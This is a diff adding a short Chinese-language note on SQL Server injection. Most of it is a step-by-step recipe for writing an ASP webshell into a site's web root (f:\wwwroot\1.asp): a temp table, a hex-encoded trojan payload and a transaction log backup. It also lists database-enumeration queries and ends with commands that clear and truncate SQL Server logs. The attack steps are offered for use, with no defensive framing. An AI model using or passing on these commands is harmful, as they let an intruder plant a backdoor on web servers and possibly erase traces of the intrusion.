@@ -1,0 +1,35 @@
+select * from master.dbo.sysdatabases　 列出所有列的记录
+ 
+select name from master.dbo.sysdatabases 仅列出name列的记录
+
+注意:可以利用log和数据库备份两上都行,log备份不成功用数据库备份
+
+alter database 数据库名 set RECOVERY FULL--
+
+create table cmd (a image)--                    \**cmd是创建的临时表
+
+backup log 数据库名 to disk = 'f:\wwwroot\1.asp' with init--
+
+insert into cmd(a) values (0x130a0d0a663A5CCDF8D5BE5CCDF8CDA8C6F3D2B5425C626C75656B6973735C7765625C312E6173700d0a)--
+
+//木马存放路径（转换16进制0x130a0d0a替换原来0x最后添加0d0a要多加几个）
+
+backup log 数据库名 to disk = 'f:\wwwroot\1.asp'--  (要备份的目录)
+
+drop table cmd--
+
+
+f:\
+16进制转换(0x130a0d0a663A5CCDF8D5BE5CCDF8CDA8C6F3D2B5425C626C75656B6973735C7765625C312E6173700d0a)
+
+最好多加几个回车0d0a,要不会出错哈
+
+
+SQL   Server日志清空方法   
+
+在查询分析器中顺序执行以下三步，其中   databasename   为你的数据库文件名 
+1.清空日志：DUMP   TRANSACTION   databasename   WITH   NO_LOG   
+
+2.截断事务日志：BACKUP   LOG   databasename   WITH   NO_LOG   
+
+3.收缩数据库：DBCC   SHRINKDATABASE(databasename)   
